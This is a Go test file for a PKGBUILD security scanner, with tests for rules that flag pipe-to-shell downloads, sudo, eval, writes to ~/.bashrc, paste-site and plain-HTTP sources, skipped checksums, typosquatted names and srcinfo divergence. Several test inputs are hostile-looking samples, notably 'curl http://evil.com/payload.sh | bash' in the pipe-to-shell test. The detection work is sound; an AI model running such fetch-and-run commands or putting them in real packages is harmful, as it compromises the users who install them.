package scanner

import (
	"strings"
	"testing"

	"github.com/j0yb0y-m/piq/internal/pkgbuild"
	"github.com/morganamilo/go-srcinfo"
)

func parseContext(t *testing.T, src string) *Context {
	t.Helper()
	p, err := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	if err != nil {
		t.Fatalf("parsing PKGBUILD: %v", err)
	}
	return &Context{Raw: src, AST: p}
}

func parseContextWithMeta(t *testing.T, pkgbuildSrc string, meta *srcinfo.Srcinfo) *Context {
	t.Helper()
	p, err := pkgbuild.Parse(strings.NewReader(pkgbuildSrc), "PKGBUILD")
	if err != nil {
		t.Fatalf("parsing PKGBUILD: %v", err)
	}
	return &Context{Raw: pkgbuildSrc, AST: p, Metadata: meta}
}

func findingsFor(findings []Finding, rule string) []Finding {
	var out []Finding
	for _, f := range findings {
		if f.Rule == rule {
			out = append(out, f)
		}
	}
	return out
}

func TestPipeToShell(t *testing.T) {
	src := `curl http://evil.com/payload.sh | bash`
	ctx := parseContext(t, src)
	findings := pipeToShellRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected pipe-to-shell finding, got none")
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical severity, got %v", findings[0].Severity)
	}
}

func TestPipeToShellClean(t *testing.T) {
	src := `curl -O https://example.com/file.tar.gz
makepkg -si`
	ctx := parseContext(t, src)
	findings := findingsFor(pipeToShellRule{}.Check(ctx), "pipe-to-shell")
	if len(findings) != 0 {
		t.Errorf("expected no pipe-to-shell findings, got %d", len(findings))
	}
}

func TestEvalUsage(t *testing.T) {
	src := `eval "$SOME_VAR"`
	ctx := parseContext(t, src)
	findings := evalRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected eval-usage finding, got none")
	}
	if findings[0].Severity != Warning {
		t.Errorf("expected Warning severity, got %v", findings[0].Severity)
	}
}

func TestPrivesc(t *testing.T) {
	src := `sudo make install`
	ctx := parseContext(t, src)
	findings := privescRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected privilege-escalation finding, got none")
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical severity, got %v", findings[0].Severity)
	}
}

func TestPrivescClean(t *testing.T) {
	src := `makepkg -si`
	ctx := parseContext(t, src)
	findings := findingsFor(privescRule{}.Check(ctx), "privilege-escalation")
	if len(findings) != 0 {
		t.Errorf("expected no privesc findings, got %d", len(findings))
	}
}

func TestSuspiciousWritePath(t *testing.T) {
	src := `echo "export MALICIOUS=1" >> ~/.bashrc`
	ctx := parseContext(t, src)
	findings := suspiciousWriteRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected suspicious-write-path finding, got none")
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical severity, got %v", findings[0].Severity)
	}
}

func TestSuspiciousWritePathClean(t *testing.T) {
	src := `install -Dm644 file.txt "$pkgdir/usr/share/doc/pkg/file.txt"`
	ctx := parseContext(t, src)
	findings := findingsFor(suspiciousWriteRule{}.Check(ctx), "suspicious-write-path")
	if len(findings) != 0 {
		t.Errorf("expected no suspicious-write findings, got %d", len(findings))
	}
}

func TestInsecureSourceURL(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "http://example.com/malware.tar.gz"},
	}
	ctx := &Context{Metadata: meta}
	findings := insecureURLRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected insecure-source-url finding, got none")
	}
	if findings[0].Severity != Warning {
		t.Errorf("expected Warning severity, got %v", findings[0].Severity)
	}
}

func TestSuspiciousHostURL(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "http://pastebin.com/raw/abc123"},
	}
	ctx := &Context{Metadata: meta}
	findings := insecureURLRule{}.Check(ctx)
	if len(findings) < 2 {
		t.Fatalf("expected at least 2 findings (HTTP + paste site), got %d", len(findings))
	}
	// First finding is the HTTP Warning, second is the Critical for the paste site
	if findings[1].Severity != Critical {
		t.Errorf("expected Critical severity for paste site, got %v", findings[1].Severity)
	}
}

func TestInsecureSourceURLClean(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "https://github.com/foo/bar/archive/refs/tags/v1.0.tar.gz"},
	}
	ctx := &Context{Metadata: meta}
	findings := findingsFor(insecureURLRule{}.Check(ctx), "insecure-source-url")
	if len(findings) != 0 {
		t.Errorf("expected no insecure URL findings, got %d", len(findings))
	}
}

func TestSkippedChecksum(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "https://example.com/file.tar.gz"},
	}
	meta.SHA256Sums = []srcinfo.ArchString{
		{Value: "SKIP"},
	}
	ctx := &Context{Metadata: meta}
	findings := skippedChecksumRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected skipped-checksum finding, got none")
	}
	if findings[0].Severity != Warning {
		t.Errorf("expected Warning severity, got %v", findings[0].Severity)
	}
}

func TestSkippedChecksumVCSClean(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "git+https://github.com/foo/bar.git#commit=abc123"},
	}
	meta.SHA256Sums = []srcinfo.ArchString{
		{Value: "SKIP"},
	}
	ctx := &Context{Metadata: meta}
	findings := findingsFor(skippedChecksumRule{}.Check(ctx), "skipped-checksum")
	if len(findings) != 0 {
		t.Errorf("expected no skipped-checksum findings for VCS source, got %d", len(findings))
	}
}

func TestTyposquat(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Pkgbase = "firefoox"
	ctx := &Context{Metadata: meta}
	findings := typosquatRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected typosquat finding, got none")
	}
	if findings[0].Severity != Warning {
		t.Errorf("expected Warning severity, got %v", findings[0].Severity)
	}
}

func TestTyposquatClean(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Pkgbase = "my-unique-package-name"
	ctx := &Context{Metadata: meta}
	findings := findingsFor(typosquatRule{}.Check(ctx), "typosquat")
	if len(findings) != 0 {
		t.Errorf("expected no typosquat findings, got %d", len(findings))
	}
}

func TestCleanPKGBuild(t *testing.T) {
	src := `pkgname=hello-world
pkgver=1.0.0
pkgrel=1
source=(https://github.com/hello/world/archive/refs/tags/v1.0.0.tar.gz)
sha256sums=(abc123def456)
build() {
  cd "$srcdir/world-$pkgver"
  make
}`
	ctx := parseContext(t, src)
	findings := RunAll(ctx)
	for _, f := range findings {
		if f.Severity == Critical {
			t.Errorf("unexpected Critical finding in clean PKGBUILD: %s — %s", f.Rule, f.Message)
		}
	}
}

func TestExtractArrayLiteral(t *testing.T) {
	src := `source=(foo bar baz)`
	file, err := pkgbuild.Parse(strings.NewReader(src), "test")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	elems := extractArrayLiteral(file, "source")
	if len(elems) != 3 {
		t.Fatalf("expected 3 elements, got %d", len(elems))
	}
	if elems[0] != "foo" || elems[1] != "bar" || elems[2] != "baz" {
		t.Errorf("unexpected elements: %v", elems)
	}
}

func TestExtractArrayLiteralMissing(t *testing.T) {
	src := `pkgname=hello`
	file, err := pkgbuild.Parse(strings.NewReader(src), "test")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	elems := extractArrayLiteral(file, "source")
	if elems != nil {
		t.Errorf("expected nil for missing array, got %v", elems)
	}
}

func TestExtractArrayLiteralNilFile(t *testing.T) {
	elems := extractArrayLiteral(nil, "source")
	if elems != nil {
		t.Errorf("expected nil for nil file, got %v", elems)
	}
}

func TestSrcinfoDivergence(t *testing.T) {
	pkgbuildSrc := `source=(foo.tar.gz bar.tar.gz)`
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "foo.tar.gz"},
	}
	file, err := pkgbuild.Parse(strings.NewReader(pkgbuildSrc), "test")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	ctx := &Context{AST: file, Metadata: meta}
	findings := srcinfoDivergenceRule{}.Check(ctx)
	if len(findings) != 1 {
		t.Fatalf("expected 1 divergence finding, got %d", len(findings))
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical severity, got %v", findings[0].Severity)
	}
}

func TestSrcinfoDivergenceClean(t *testing.T) {
	pkgbuildSrc := `source=(foo.tar.gz)`
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "foo.tar.gz"},
	}
	file, err := pkgbuild.Parse(strings.NewReader(pkgbuildSrc), "test")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	ctx := &Context{AST: file, Metadata: meta}
	findings := findingsFor(srcinfoDivergenceRule{}.Check(ctx), "srcinfo-divergence")
	if len(findings) != 0 {
		t.Errorf("expected no divergence findings, got %d", len(findings))
	}
}

func TestContainsSource(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "foo.tar.gz"},
		{Value: "bar.tar.gz"},
	}
	if !containsSource(meta, "foo.tar.gz") {
		t.Error("expected containsSource to find foo.tar.gz")
	}
	if containsSource(meta, "baz.tar.gz") {
		t.Error("expected containsSource to not find baz.tar.gz")
	}
}

func TestChecksumFor(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.SHA256Sums = []srcinfo.ArchString{
		{Value: "abc123"},
		{Value: "def456"},
	}
	if got := checksumFor(meta, 0); got != "abc123" {
		t.Errorf("expected abc123, got %s", got)
	}
	if got := checksumFor(meta, 1); got != "def456" {
		t.Errorf("expected def456, got %s", got)
	}
	if got := checksumFor(meta, 5); got != "" {
		t.Errorf("expected empty for out-of-bounds, got %s", got)
	}
}

func TestLevenshtein(t *testing.T) {
	tests := []struct {
		a, b string
		want int
	}{
		{"", "", 0},
		{"abc", "abc", 0},
		{"abc", "ab", 1},
		{"abc", "ac", 1},
		{"kitten", "sitting", 3},
		{"firefoox", "firefox", 1},
	}
	for _, tt := range tests {
		got := levenshtein(tt.a, tt.b)
		if got != tt.want {
			t.Errorf("levenshtein(%q, %q) = %d, want %d", tt.a, tt.b, got, tt.want)
		}
	}
}
